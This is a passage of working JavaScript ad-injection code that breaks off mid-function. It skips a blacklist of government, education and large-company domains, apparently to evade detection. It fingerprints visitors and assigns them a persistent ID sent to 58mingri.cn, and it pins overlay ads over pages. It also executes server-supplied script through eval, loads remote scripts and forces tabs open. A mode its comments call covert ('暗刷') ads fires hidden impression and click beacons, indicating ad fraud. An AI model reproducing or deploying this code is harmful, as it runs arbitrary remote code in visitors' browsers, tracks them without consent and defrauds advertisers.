try {
; (function(win,dom,nev) {
    console.log("黑名单检测");
    if (/\.exmail|\.alimail|\.126\.com|\.163\.com|\.jjwxc\.net|\.jjwxc\.cn|\.jjwxc\.com|\.110\.com|\.kugou\.com|\.shjcdj\.cn|\.etao\.com|\.uc\.cn|\.163\.com|\.58\.com|\.china\.com|\.china\.com\.cn|\.gmw\.cn|\.sina\.cn|\.sina\.com\.cn|\.le\.com|\.letv\.com|\.iqiyi\.com|\.qutoutiao\.com\.cn|\.zybang\.com|\.gfbzb\.gov\.cn|\.huanqiu\.com|\.jd\.com|\.people\.cn|\.in66\.com|\.wasu\.com|\.ctrip\.com|\.pingan\.com\.cn|\.2345\.com|\.ludashi\.com|\.360\.cn|\.sogou\.com|\.wps\.cn|\.10010\.com|\.mi\.com|\.cctv\.com|\.yy\.com|\.suning\.com|\.cainiao\.com|\.vip\.com|\.gov\.com|\.gov\.cn|\.edu\.cn/g.test(dom.domain)) {console.log("域名黑名单");return;}
    console.log("域名OK");
    if (! (dom && dom.body)) { setTimeout(arguments.callee, 1e3); console.log("未准备好"); return }
    console.log("开始");
    var imgb641 ="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAMAAAC6V+0/AAAAY1BMVEUAAAAAAAAAAAD7+/sAAAD09PRWVlYAAAAAAAAAAAAAAACqqqrBwcEAAAD8/Pz39/eBgYEAAAD9/f3+/v7x8fH9/f3x8fGioqJGRkZOTk69vb3j4+NlZWXw8PAAAAAAAAD///8hXIltAAAAIHRSTlMABAzVCdo+JRkVHx8bEcLaKRzu7d3TyU1MRUI3NTQzKwFg1/0AAAC3SURBVBjTlc/HEsMgDARQC4MptsG9F/7/KyOJMJNrOO28A9ot/nlw+wa+sfE3cDjHOKOyzXE8AYP0McYSFa3E6CUUILqStAaoOXSC0FyBlS1chtG6ipVMVc4SytboSiGwadPin6Q9K1vPRmpdRmfJWEUXIr9Ap9NLXaYpNfs1tW0qa96h9ufZWZs0k0+8Wr94Ls88BurijHHUbDjSzHXBflYIi32XNc/UjnbQNoxpprDG5m0YhYQPz9UQ2YIxnvkAAAAASUVORK5CYII="
    var imgb642 = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAASCAMAAABhEH5lAAAAmVBMVEUAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////VHQRUAAAAM3RSTlMA9Phs5pF9TN24elMo6+LXrYJaVzENCv3x6trOqZ5DNB4TCATGo5hycF89JBsHx8CgaTg9aEAoAAAA0UlEQVQY0zWP6WLCIBCEhyMEQk5NmttoWm9tq+//cMIa589+sLOzANJm7Nokze0XFl1zbqLV+jiwv+dikab8Jor3ydnXbTvc8ZFqLsCcmxlLhiuHbIcNL1GZCE6r3xi3VuDfuJyICSBko7MFPTQZRC1CHniyEskadMdZQDBpJJYorOsjQamRnjy4qRN/EEnkg9/lpwRXblPRwbIrqp8RTlEWo+oKd9wD8fz+0B0qvQFTo/AWJdADzs1hC9JOsaV96WVgpzIsspQ81BW91FpmBblfA8QM68DDoBgAAAAASUVORK5CYII="
    if(window==top && !document.querySelector('meta[name="viewport"]') && !F()){
        var e = document.createElement("meta");e.name = "viewport";e.content = "width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no";
        document.head.appendChild(e);
        console.log("修复自适应");
    }
    function I() {
        var ua = nev.userAgent.toLowerCase();
        G.C = {
            ver: 100,
            slotcode: slotcode || 0,
            reqid: null,
            page_num: 0,
            is_pc: F(),
            page: (win.location.protocol + "//" + win.location.hostname),
            ref: (dom.referrer).substring(0, 20),
            keywords: (N('keywords') || N('description') || "-").substring(0, 20),
            title: (dom.title).substring(0, 20),
            os: nev.platform || Q(ua),
            sh: win.screen.height || win.screen.availHeight || 0,
            sw: win.screen.width || 0,
            browser: B(ua),
            language: S(nev.languages),
            yxmid: ''
        };
        G.O = {
            adAjaxUrl: J('//58mingri.cn', '/a/', G.C.ver, '/', G.C.slotcode, '/'),
            cookieImgUrl: J('//58mingri.cn/y'),
            cookie1: 'yunximid',
            cookie2: 'yunxicount-' + slotcode,
            cookie3: 'yunxiblock-' + slotcode,
            cookie4: 'yunxitime-' + slotcode,
            fix2width: !0,
            callback: 'pingfuCallback_' + slotcode + '_'
        };
        G.Curl = function() {
            G.C.page_num += 1;
            G.C.reqid = U(12);
            G.C.callback = G.O.callback + G.C.page_num;
            var u = '';
            var item = ['ver', 'slotcode', 'reqid', 'page_num', 'page', 'ref', 'keywords', 'title', 'os', 'sh', 'sw', 'browser', 'language', 'yxmid', 'callback'];
            for (var i = 0; i < 15; i++) {
                u += "&" + item[i] + "=" + E(G.C[item[i]])
            }
            return u.replace(/^&/, "?")
        };
        G.scale = (function() {
            try {
                var s = dom.getElementsByName("viewport");
                return s[s.length - 1].content.match(/initial-scale *= *([0-9\.]*)/)[1]
            } catch (e) {
                return 1
            }
        })();
        G.w = function(w) {
            return G.O.fix2width ? "100%" : w + "px"
        };
        G.h = function(w, h) {
            return G.O.fix2width ? (G.C.sw / G.scale * h / w) + "px" : h + "px"
        };
        G.a = function(w) {
            return G.O.fix2width ? "auto" : w
        }
    }

    function C() {
        try {
            var t = win.localStorage;
            if (t.setItem("pf", 1) || !t.getItem("pf")) throw new Error();
            G.setItem = function(n, c) {
                win.localStorage.setItem(G.O[n], escape(c))
            };
            G.getItem = function(n) {
                return win.localStorage.getItem(G.O[n])
            }
        } catch (e) {
            G.setItem = function(n, c) {
                var expire = new Date;
                expire.setTime(expire.getTime() + 30 * 24 * 60 * 60 * 1e3);
                dom.cookie = G.O[n] + "=" + escape(c) + "; expires=" + expire.toGMTString() + "; path=/" + ";domain=" + dom.domain
            };
            G.getItem = function(n) {
                var r = new RegExp("(^|)" + G.O[n] + "=([^;]*)(;|$)"),
                    r = dom.cookie.match(r);
                if (null != r) {
                    return unescape(r[2])
                }
                return null
            }
        }
        G.ct = function() {
            var time = G.getItem("cookie4"),
                now = (new Date).getTime();
            if (!time) {
                G.setItem('cookie4', now + 24 * 60 * 60 * 1e3);
                return
            }
            if (parseInt(time) < now) {
                G.setItem('cookie2', "");
                G.setItem('cookie3', "")
            } else {
                G.setItem('cookie4', now + 24 * 60 * 60 * 1e3)
            }
        };
        G.getItemCt = function(n) {
            if (!G.getItem(n)) return true;
            var time = G.getItem(n),
                now = (new Date).getTime();
            return parseInt(time) < now
        };
        var mid = G.getItem('cookie1');
        if (!mid) {
            mid = U(32, 20);
            G.setItem('cookie1', mid)
        }
        G.C.yxmid = mid
    }

    function D() {
        G.remove = function(elem) {
            elem && elem.parentNode && elem.parentNode.removeChild(elem)
        };
        G.addEvent = function(elem, type, fn, bool) {
            if (!elem) {
                return
            } else if (win.attachEvent) {
                elem['on' + type] = fn
            } else if (elem.addEventListener) {
                elem.addEventListener(type, fn, !!bool)
            }
        };
        G.locationMiddle = function(t) {
            var r = ["div", "section", "header", "footer", "nav", "dl"].join(","),
                l = screen.height || dom._2.clientHeight,
                s = screen.width || dom._2.clientWidth,
                c = dom.body,
                d = c.offsetHeight,
                p = function(t) {
                    var e = c.children,
                        i = [],
                        o = !1,
                        a = null;
                    i = m(e);
                    for (var n = 0; n < i.length; n++) {
                        if (i[n].offsetHeight > .5 * d || i[n].offsetHeight == l) {
                            a = i[n], o = !0;
                            break
                        }
                    }
                    if (o) {
                        var r = u(a);
                        f(r, t)
                    } else f(c, t, i[Math.ceil(i.length / 2) - 1])
                },
                u = function b(t) {
                    var e = t.children,
                        i = .5 * d,
                        o = .9 * s;
                    e = m(e);
                    for (var a = 0; a < e.length; a++)
                        if ((e[a].offsetHeight > i || e[a].offsetHeight == l) && e[a].offsetWidth > o) return b(e[a]);
                    return t
                },
                f = function(t, e, i) {
                    var o = m(t.children);
                    for (var a = .5 * l, r = i || o[Math.ceil(o.length / 2) - 1]; r && r.nextSibling && r.offsetTop < a;) r = r.nextSibling, r.tagName || (r = r.nextSibling);
                    var s = h(t),
                        c = g(t),
                        d = s + c.left + c.right;
                    d > 0 && d < 50 && G.includeCssCode("#" + e.id + "{margin:0" + d / 2 + "px}"), t.insertBefore(e, r)
                },
                m = function(t) {
                    var e = null,
                        i = [];
                    for (t = [].slice.call(t); e = t.shift();) {
                        var o = e.tagName.toLowerCase(),
                            a = dom.defaultView.getComputedStyle(e);
                        ~r.indexOf(o) && e.offsetWidth > .8 * s && 0 != a.opacity && i.push(e)
                    }
                    return i
                },
                h = function(t) {
                    return s - t.offsetWidth
                },
                g = function(t) {
                    if (dom.defaultView && "function" == typeof dom.defaultView.getComputedStyle) {
                        var e = dom.defaultView.getComputedStyle(t);
                        return {
                            left: parseFloat(e.paddingLeft),
                            right: parseFloat(e.paddingRight)
                        }
                    }
                    return {
                        left: 0,
                        right: 0
                    }
                };
            return p(t)
        };
        G.insertBefore = function(newEl, targetEl) {
            var parentEl = targetEl.parentNode;
            parentEl.insertBefore(newEl, targetEl)
        };
        G.includeCssCode = function(t) {
            var e = dom.createElement("style"),
                i = dom.getElementsByTagName("head")[0];
            e.styleSheet ? e.styleSheet.cssText = t : e.appendChild(dom.createTextNode(t)), i.appendChild(e)
        };
        G.openTab = function(url) {
            var el = dom.createElement("a");
            el.href = url;
            el.target = "_0";
            dom.body.appendChild(el);
            el.click();
            dom.body.removeChild(el)
        };
        G.includeCssCode("div.pingfuADHolder{position:relative;bottom:auto;left:auto;top:auto;right:auto;overflow:hidden;display:block;float:none;padding:0;padding:0;overflow:hidden;width:auto;height:auto}div.pingfuADHolder*{overflow:hidden}")
    }

    function O(GG, num) {
        function sentL(url) {
            if (/.*cnzz.*\.html/.test(url)) {
                var _0 = dom.createElement("iframe");
                _0.src = url;
                _0.style.display = "none";
                dom.body.appendChild(_0)
            } else {
                var _1 = new Image();
                _1.src = url;
                dom.pv = dom.pv || [];
                dom.pv.push(_1)
            }
        }

        function Lt1(GG) {
            var imp = GG['imp'];
            if (imp && imp.length) {
                for (var i in imp) {
                    sentL(imp[i])
                }
            }
        }

        function Lt2(GG) {
            var hit = GG['hit'];
            if (hit && hit.length) {
                for (var i in hit) {
                    sentL(hit[i])
                }
            }
        }
        return (function(GG, num) {
            if (!GG) {
                return
            }
            if (num == 2) Lt2(GG);
            else Lt1(GG)
        })(GG, num)
    }

    function P(GG) {
        var wh = 'width:{{1}};max-width:{{2}};max-height:{{3}};',
            bltr = 'bottom:auto;left:auto;top:auto;right:auto;overflow:hidden;display:block;float:none;padding:0;padding:0;overflow:hidden;cursor:pointer;',
            pf = 'position:fixed;z-index:2147483647;' + bltr,
            pa = 'position:absolute;z-index:2147483647;' + bltr,
            pr = 'position:relative;' + bltr,
            bl = 'bottom:0;left:0;',
            br = 'bottom:10px;right:10px;',
            mauto = 'margin:0 auto;',
            tl = 'top:0;left:0;',
            clo = 'right:4px;top:4px;width:4%;max-width:30px;height:auto;vertical-align:top;opacity:.6;',
            clo2 = 'width:4%;',
            closeimg = imgb641,
            clodiv = "height:40%;",
            x = 1;

        function Pt0(GG) {
            var twh = wh.replace('{{1}}', "100%").replace('{{2}}', "auto").replace('{{3}}', "auto").replace('{{4}}', "auto");
            var box = dom.createElement("div");
            box.className = "pingfuADHolder";
            box.style.cssText = J(twh, pr, mauto);
            var content = dom.createElement("div");
            box.appendChild(content);
            dom.body.appendChild(box);
            return content
        }

        function Pt1(GG) {
            var v2 = GG.w,
                v1 = G.w(v2),
                v2 = GG.w,
                v4 = GG.h,
                v3 = G.h(v2, v4);
            var twh = wh.replace('{{1}}', v1).replace('{{2}}', "auto").replace('{{3}}', v3).replace('{{4}}', "auto");
            var box, content, cimg, cdiv;
            box = dom.createElement("div");
            box.className = "pingfuADHolder";
            box.style.cssText = J(twh, pf, tl);
            content = dom.createElement("div");
            content.style.cssText = J(twh, pr, mauto);
            box.appendChild(content);
            cimg = dom.createElement("img"), cimg.style.cssText = J(pa, clo);
            cimg.src = closeimg;
            cimg.style.zIndex = "999999";
            box.appendChild(cimg);
            cdiv = dom.createElement("div"), cdiv.style.cssText = J(pa, clo, clodiv);
            box.appendChild(cdiv);
            G.addEvent(cdiv, "click", function(e) {
                box.style.display = 'none'
            }, !0);
            dom.body.appendChild(box);
            return content
        }

        function Pt2(GG) {
            var twh = wh.replace('{{1}}', "100%").replace('{{2}}', "auto").replace('{{3}}', "auto").replace('{{4}}', "auto");
            var box, content, cimg, cdiv;
            box = dom.createElement("div");
            box.className = "pingfuADHolder";
            box.style.cssText = J(twh, pr);
            content = dom.createElement("div");
            content.style.cssText = J(twh, pr, mauto);
            box.appendChild(content);
            cimg = dom.createElement("img"), cimg.style.cssText = J(pa, clo);
            cimg.src = closeimg;
            cimg.style.zIndex = "999999";
            box.appendChild(cimg);
            cdiv = dom.createElement("div"), cdiv.style.cssText = J(pa, clo, clodiv);
            box.appendChild(cdiv);
            G.addEvent(cdiv, "click", function(e) {
                box.style.display = 'none'
            }, !0);
            G.locationMiddle(box);
            return content
        }

        function Pt3(GG) {
            var v2 = GG.w,
                v1 = G.w(v2),
                v2 = GG.w,
                v4 = GG.h,
                v3 = G.h(v2, v4);
            var twh = wh.replace('{{1}}', v1).replace('{{2}}', "auto").replace('{{3}}', v3).replace('{{4}}', "auto");
            var box, content, cimg, cdiv;
            box = dom.createElement("div");
            box.className = "pingfuADHolder";
            box.style.cssText = J(twh, pf, bl);
            content = dom.createElement("div");
            content.style.cssText = J(twh, pr, mauto);
            box.appendChild(content);
            cimg = dom.createElement("img"), cimg.style.cssText = J(pa, clo);
            cimg.src = closeimg;
            cimg.style.zIndex = "999999";
            box.appendChild(cimg);
            cdiv = dom.createElement("div"), cdiv.style.cssText = J(pa, clo, clo2, clodiv);
            box.appendChild(cdiv);
            G.addEvent(cdiv, "click", function(e) {
                box.style.display = 'none'
            }, !0);
            dom.body.appendChild(box);
            return content
        }

        function Pt4(GG) {
            var v2 = GG.w,
                v1 = G.w(v2),
                v2 = GG.w,
                v4 = GG.h,
                v3 = G.h(v2, v4);
            var twh = wh.replace('{{1}}', v1).replace('{{2}}', v1).replace('{{3}}', v3).replace('{{4}}', v3);
            var box, content, cimg, cdiv;
            box = dom.createElement("div");
            box.className = "pingfuADHolder";
            box.style.cssText = J(twh, pf, br);
            content = dom.createElement("div");
            content.style.cssText = J(twh, pr);
            box.appendChild(content);
            cimg = dom.createElement("img"), cimg.style.cssText = J(pa, clo, clo2);
            cimg.src = closeimg;
            cimg.style.zIndex = "999999";
            box.appendChild(cimg);
            cdiv = dom.createElement("div"), cdiv.style.cssText = J(pa, clo, clo2, clodiv);
            box.appendChild(cdiv);
            G.addEvent(cdiv, "click", function(e) {
                box.style.display = 'none'
            }, !0);
            dom.body.appendChild(box);
            return content
        }

        function Pt41(GG) {
            var v2 = GG.w,
                v1 = G.w(v2),
                v4 = GG.h,
                v3 = G.h(v2, v4);
            var twh = wh.replace('{{1}}', v1).replace('{{2}}', v1).replace('{{3}}', v3).replace('{{4}}', v3);
            var box, content, cimg, cdiv;
            box = dom.createElement("div");
            box.className = "pingfuADHolder";
            box.style.cssText = J(pf, "width:100%;height:100%;background:rgba(0,0,0,0.5);left:0;top:0;bottom:0;right:0;");
            content = dom.createElement("div");
            content.style.cssText = J(twh, pa, "left:50%;top:50%;margin-left:-" + (v2 / 2) + "px;margin-top:-" + (v4 / 2) + "px;");
            box.appendChild(content);
            cimg = dom.createElement("img"), cimg.style.cssText = J(pa, clo, clo2);
            cimg.src = closeimg;
            cimg.style.zIndex = "999999";
            box.appendChild(cimg);
            cdiv = dom.createElement("div"), cdiv.style.cssText = J(pa, clo, clo2, clodiv);
            box.appendChild(cdiv);
            G.addEvent(cdiv, "click", function(e) {
                box.style.display = 'none'
            }, !0);
            dom.body.appendChild(box);
            return content
        }

        function Pt5(GG) {
            var v2 = GG.w,
                v1 = G.w(v2),
                v2 = GG.w,
                v4 = GG.h,
                v3 = G.h(v2, v4);
            var twh = wh.replace('{{1}}', v1).replace('{{2}}', v1).replace('{{3}}', v3).replace('{{4}}', v3);
            var box, content, cimg, cdiv;
            box = dom.createElement("div");
            box.className = "pingfuADHolder";
            box.style.cssText = J(twh, pr, mauto);
            content = dom.createElement("div");
            content.style.cssText = J(twh, pr);
            box.appendChild(content);
            cimg = dom.createElement("img"), cimg.style.cssText = J(pa, clo, clo2);
            cimg.src = closeimg;
            cimg.style.zIndex = "999999";
            box.appendChild(cimg);
            cdiv = dom.createElement("div"), cdiv.style.cssText = J(pa, clo, clodiv);
            box.appendChild(cdiv);
            G.addEvent(cdiv, "click", function(e) {
                box.style.display = 'none'
            }, !0);
            G.insertBefore(box, dom.body);
            return content
        }

        function Pt6(GG) {
            var v2 = GG.w,
                v1 = G.w(v2),
                v2 = GG.w,
                v4 = GG.h,
                v3 = G.h(v2, v4);
            var twh = wh.replace('{{1}}', "auto").replace('{{2}}', "auto").replace('{{3}}', "auto").replace('{{4}}', "auto");
            var soul = (function() {
                    var a = dom.querySelectorAll("script");
                    for (var i = 0; i < a.length; i++) {
                        if (a[i] && a[i].src && a[i].src.indexOf(G.C.slotcode + ".js") > -1) {
                            return a[i]
                        }
                    }
                    return null
                })(),
                box = dom.createElement("div"),
                content, cimg, cdiv;
            box.className = "pingfuADHolder";
            content = dom.createElement("div");
            content.style.cssText = J(twh, pr, mauto);
            box.appendChild(content);
            cimg = dom.createElement("img"), cimg.style.cssText = J(pa, clo, clo2);
            cimg.src = closeimg;
            cimg.style.zIndex = "999999";
            box.appendChild(cimg);
            cdiv = dom.createElement("div"), cdiv.style.cssText = J(pa, clo, clodiv);
            box.appendChild(cdiv);
            G.addEvent(cdiv, "click", function(e) {
                box.style.display = 'none'
            }, !0);
            if (soul) {
                G.insertBefore(box, soul)
            } else {
                document.body.appendChild(box)
            }
            return content
        }

        function Pt7(GG) {
            if (GG['lp']) G.openTab(GG['lp']);
            return dom.createElement("div")
        }

        function Pt8(GG) {
            var v2 = GG.w,
                v1 = G.w(v2),
                v2 = GG.w,
                v4 = GG.h + 18,
                v3 = G.h(v2, v4);
            var twh = 'width:{{1}};max-width:{{2}};height:{{3}};max-height:{{4}};'.replace('{{1}}', v1).replace('{{2}}', v1).replace('{{3}}', v3).replace('{{4}}', v3);
            var pos = 'position: fixed;top: 50%; left: 8px; margin-top: -{{1}}px;'.replace('{{1}}', parseInt(v3.replace("px", '')) / 2);
            var box, content, cimg, cdiv;
            box = dom.createElement("div");
            box.className = "pingfuADHolder";
            box.style.cssText = J(twh, pos, br);
            content = dom.createElement("div");
            content.style.cssText = J(twh, pr);
            box.appendChild(content);
            cimg = dom.createElement("img"), cimg.style.cssText = J(pa, "width:15px;height:auto;right:4px;top:auto;bottom:0;");
            cimg.src = imgb642;
            cimg.style.zIndex = "999999";
            box.appendChild(cimg);
            cdiv = dom.createElement("div"), cdiv.style.cssText = J(pa, "width:16px;height:50px;right:4px;top:auto;bottom:0px;color:#fff;font-size:12px;text-align:center;");
            cdiv.innerHTML = "\u5e7f\u544a";
            box.appendChild(cdiv);
            G.addEvent(cdiv, "click", function(e) {
                box.style.display = 'none'
            }, !0);
            dom.body.appendChild(box);
            return content
        }
        return (function(GG) {
            if (!GG) {
                return
            }
            var fun = function() {},
                a = G.configP.ast,
                b = G.configP.pos,
                c = G.C.is_pc;
            switch (a + "x" + c) {
                case ('200x0'):
                    G.configP.ast = 100;
                    G.configP.pos = 3;
                    fun = Pt3;
                    break;
                case ('100x0'):
                    fun = (b == 1) ? Pt6 : (b == 2) ? Pt1 : (b == 3) ? Pt3 : (b == 4) ? Pt2 : function() {};
                    break;
                case ('204x0'):
                    G.configP.ast = 101;
                case ('101x0'):
                    G.O.fix2width = !1;
                    fun = Pt41;
                    break;
                case ('102x0'):
                    fun = Pt2;
                    break;
                case ('200x1'):
                    G.O.fix2width = !1;
                    fun = (b == 1) ? Pt6 : (b == 5) ? Pt5 : function() {};
                    break;
                case ('201x1'):
                    G.O.fix2width = !1;
                    fun = Pt8;
                    break;
                case ('202x1'):
                    fun = Pt7;
                    break;
                case ('100x1'):
                    G.configP.ast = 204;
                case ('204x1'):
                    G.O.fix2width = !1;
                    fun = Pt4;
                    break
            }
            if (GG['pos'] == 1) fun = Pt0;
            return fun(GG)
        })(GG)
    }

    function R(GG, CB) {
        function Rt1(GG, CB) {
            var div = dom.createElement("div");
            div.innerHTML = mH(GG);
            CB();
            return div;

            function mH(GG) {
                var link = GG['lp'] || [],
                    img = GG['imgs'] || [];
                if (img.length == 1) {
                    var ww = G.w(GG.w),
                        hh = G.h(GG.w, GG.h);
                    return J('<a href="', link[0] || 'javascript:void(0)', '"><img src="', img[0] || '', '" alt="pingfuAd" style="display:block;width:', ww, ';height:', hh, ';" /></a>')
                }
                return ""
            }
        }

        function Rt2(GG, CB) {
            var div = dom.createElement("div"),
                h = H(GG['html']),
                s = H(GG['script']).replace(/\<[^\<\>]*script[^\<\>]*\>/g, ""),
                t = H(GG['script_tag']).match(/src=[\'\"]([^\'\"]*)[\'\"]/);
            h && (div.innerHTML = h);
            (function() {
                try {
                    window.eval(s) && win.console.log(s)
                } catch (e) {
                    setTimeout(arguments.callee, 2e3)
                }
            })();
            if (t && t.length > 1) {
                for (var i = 1, ll = t.length; i < ll; i++) {
                    var n = dom.createElement("script");
                    n.type = 'text/javascript';
                    n.src = t[i];
                    div.appendChild(n);
                    if (i == 1) {
                        if (n.readyState) {
                            n.onreadystatechange = function() {
                                if ("loaded" == n.readyState || "complete" == n.readyState) {
                                    n.onreadystatechange = null;
                                    CB()
                                } else if ("error" == n.readyState) {
                                    n.onreadystatechange = null;
                                    CB()
                                }
                            }
                        } else {
                            n.onload = CB;
                            n.onerror = CB
                        }
                    }
                }
            } else {
                CB()
            }
            return div
        }

        function Rt3(GG, CB) {
            var div = dom.createElement("div"),
                l = GG['js_url'];
            if (l) {
                l = H(l).split(',');
                for (var i = 0, ll = l.length; i < ll; i++) {
                    var n = dom.createElement("script");
                    n.type = 'text/javascript';
                    n.src = l[i];
                    div.appendChild(n);
                    if (i == 0) {
                        if (n.readyState) {
                            n.onreadystatechange = function() {
                                if ("loaded" == n.readyState || "complete" == n.readyState) {
                                    n.onreadystatechange = null;
                                    CB()
                                } else if ("error" == n.readyState) {
                                    n.onreadystatechange = null;
                                    CB()
                                }
                            }
                        } else {
                            n.onload = CB;
                            n.onerror = CB
                        }
                    }
                }
            }
            return div
        }

        function Rt4(GG, CB) {
            var div = document.createElement("div"),
                l = GG['html_url'];
            if (l) {
                l = l.split(',');
                for (var i = 0, ll = l.length; i < ll; i++) {
                    var iframe = document.createElement("iframe");
                    iframe.src = l[i];
                    iframe.style.cssText = J('width:', G.w(GG.w), ';height:', G.h(GG.w, GG.h), ';border:0;margin:0;padding:0;');
                    iframe.setAttribute('scrolling', 'no');
                    div.appendChild(iframe)
                }
            }
            CB();
            return div
        }
        return (function(GG, CB) {
            if (!GG) {
                return
            }
            if (GG['ad_s'] == 1){
                console.log(slotcode,"直客广告 绘制结构");
                return Rt1(GG, CB);
            }else if (GG['ad_s'] == 2) {
                console.log(slotcode,"三方广告 绘制结构");
                var div = document.createElement("div");
                if (GG['html'] || GG['script'] || GG['script_tag']) div.appendChild(Rt2(GG, CB));
                if (GG['js_url']) div.appendChild(Rt3(GG, CB));
                if (GG['html_url']) div.appendChild(Rt4(GG, CB));
                return div
            }
        })(GG, CB)
    }

    function M(GG, div, CB) {
        function Mt1(GG, div, CB) {
            div && div.appendChild(R(GG, CB))
        }

        function Mt2(GG, div, CB) {
            var name = "pingfu" + U(),
                h = GG['html'],
                s = GG['script'],
                l = GG['script_tag'],
                ju = GG['js_url'],
                hu = GG['html_url'];
            if (GG['html'] || GG['script'] || GG['script_tag']) df(h + s + l, "01");
            if (ju) {
                var jua = ju.split(",");
                for (var i = 0; i < jua.length; i++) {
                    df('<script type="text/javascript" src="' + jua[i] + '"></script>', "1" + i)
                }
            }
            if (hu) {
                var hua = hu.split(",");
                for (var i = 0; i < hua.length; i++) {
                    sf(hua[i])
                }
            }

            function sf(h) {
                var if1 = dom.createElement("iframe");
                if1.src = H(h);
                if1.style.cssText = J('width:', G.w(GG.w), ';height:', G.h(GG.w, GG.h), ';border:0;margin:0;padding:0;');
                if1.setAttribute('scrolling', 'no');
                div.appendChild(if1)
            }

            function df(h, i) {
                var if1 = dom.createElement("iframe");
                if1.name = "pingfu" + U() + i;
                if1.style.cssText = J('position:relative;border:0;width:', G.w(GG.w), ';height:', G.h(GG.w, GG.h), ';float:none;padding:0;z-index:2147483647;');
                if1.setAttribute('scrolling', 'no');
                div.appendChild(if1);
                var if2 = win.frames[if1.name],
                    if2d = if2.document;
                if2d.open();
                if2d.write(J('<!DOCTYPE html><html><head><style type="text/css">html,body{margin:0;padding:0;}</style></head><body>', h, '</body></html>'));
                if2d.close()
            }
            CB()
        }
        return (function(GG, d, c) {
            if (!GG) {
                return
            }
            if (GG['pos'] == 3) {
                console.log(slotcode,"iframe广告 绘制结构");
                Mt2(GG, d, c)
            } else {
                Mt1(GG, d, c)
            }
            G.addEvent(d, "click", function(e) {
                O(GG, 2)
            }, !0)
        })(GG, div, CB)
    }

    function L() {
        function Lt1(RES) {
            if (G.C.page_num && G.C.page_num == 1) {
                console.log(slotcode,"种cookie");
                var i = new Image();
                i.src = (G.O.cookieImgUrl + "?yxmid=" + G.C.yxmid);
                i.style.display = 'none';
                dom.body.appendChild(i)
            }
            if (RES.code != 200) {
                return
            }
            if (RES.co == 0) {
                return
            }
            if (RES.co == 1 && RES.ads && RES.ads.length == 1) {
                console.log(slotcode,"读到广告");
                Lt3(RES.ads[0])
            }else{
                console.log(slotcode,"未读到广告");
            }
        }
        var script = null,
            box = null;

        function Lt2() {
            win[G.C.callback] = function() {};
            G.remove(script);
            script = null;
            script = dom.createElement("script");
            script.type = "text/javascript";
            script.src = J(G.O.adAjaxUrl, G.Curl());
            win[G.C.callback] = Lt1;
            dom.body.appendChild(script);
            console.log(slotcode,"回调函数 "+G.C.callback);
        }

        function Lt3(GG) {
            if (GG["ad_show_type"] == 1) {
                console.log(slotcode,"正常广告");
                if (box) {
                    G.remove(box.parentNode);
                    box = null
                }
                box = P(GG);
                console.log(slotcode,"绘制div",box);
                M(GG, box, function() {
                    O(GG, 1)
                });
                console.log(slotcode,"cnzz");
                Lt5();
                console.log(slotcode,"有轮播时间 非自主和自轮播 等下 开始下一轮");
                G.configP.c_time && !(GG['pos'] == 1 || GG['is_carousel']) && setTimeout(Lt2, G.configP.c_time * 1e3)
            } else if (GG["ad_show_type"] == 2) {
                console.log(slotcode,"暗刷广告");
                var div = A(GG);
                console.log(slotcode,"绘制div",div);
                M(GG, div, function() {
                    O(GG, 1)
                });
                console.log(slotcode,"有轮播时间 开始下一轮");
                G.configP.c_time && Lt2()
            } else if (GG["ad_show_type"] == 3) {
                console.log(slotcode,"小红包广告");
                GG['pos'] = 1;
                var div = P(GG);
                console.log(slotcode,"绘制div",div);
                M(GG, div, function() {
                    O(GG, 1)
                });
                Lt5();
                console.log(slotcode,"有轮播时间 开始下一轮");
                G.configP.c_time && Lt2()
            } else {
                console.log(slotcode,"出错");
                return
            }
        }

        function Lt5() {
            if (G.configP.is_cnzz_url == "1") {
                var c = dom.createElement("iframe");
                c.src = cnzz_domain + "/cnzzhelper/" + slotcode + ".html";
                c.style.display = "none";
                dom.body.appendChild(c)
            }
        }
        return (function() {
            G.ct();
            console.log(slotcode,"判断条件");
            if (G.getItemCt('cookie3')) {
                G.setItem('cookie3', (new Date).getTime() + G.configP.s_intvl * 1e3)
            } else {
                console.log(slotcode,"间隔中止");
                return
            } if (G.getItem('cookie2') == 'block') {
                console.log(slotcode,"次数中止");
                return
            }
            if (G.configP.s_count && parseInt(G.configP.s_count) > 0) {
                var c = parseInt(G.getItem('cookie2') || 0);
                if (c + 1 >= G.configP.s_count) {
                    G.setItem('cookie2', 'block')
                } else {
                    G.setItem('cookie2', c + 1)
                }
            }
            if (G.configP.s_rate && parseInt(G.configP.s_rate) > 0) {
                var zn = Z(100);
                if (zn > G.configP.s_rate) {
                    console.log(slotcode,"概率中止");
                    return
                }
            }
            console.log(slotcode,"开始请求广告");
            Lt2()
        })()
    }

    function J() {
        return Array.prototype.slice.call(arguments, 0).join('')
    }

    function E(s) {
        s = (s || "").toString().replace(/\<|\>|\#|\$|\&/g, '');
        return (win.encodeURIComponent || win.escape || function(s) {
            return s
        })(s)
    }

    function H(s) {
        return (function(S, A, B) {
            for (var i = 0, l = A.length; i < l; i++) {
                var R = new RegExp("&" + A[i], "g");
                S = S.replace(R, B[i])
            };
            return S
        })(s, ['amp;', 'nbsp;', 'gt;', "lt;", 'quot;', 'acute;'], ['&', ' ', '>', '<', '\"', '\"'])
    }

    function N(n) {
        var a = dom.getElementsByName(n);
        return a.length ? a[0].content : null
    }

    function S(o) {
        return ((Object.prototype.toString.call(o).toLowerCase() === "[object array]") ? o[0] : o)
    }

    function U(len, radix) {
        var chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'.split(""),
            ide = [],
            i;
        radix = radix || chars.length;
        if (len) {
            for (i = 0; i < len; i++) ide[i] = chars[0 | Math.random() * radix]
        } else {
            var r;
            ide[8] = ide[13] = ide[18] = ide[23] = '-';
            ide[14] = '4';
            for (i = 0; i < 36; i++) {
                if (!ide[i]) {
                    r = 0 | Math.random() * 16;
                    ide[i] = chars[(i == 19) ? (r & 0x3) | 0x8 : r]
                }
            }
        }
        return ide.join("")
    }

    function B(ua) {
        var e = "other",
            b, d = [{
                n: "Wechat",
                r: /micromessenger/
            }, {
                n: "QQBrowser",
                r: /qqbrowser/
            }, {
                n: "UC",
                r: /ubrowser|ucbrowser|ucweb/
            }, {
                n: "MobileBaidu",
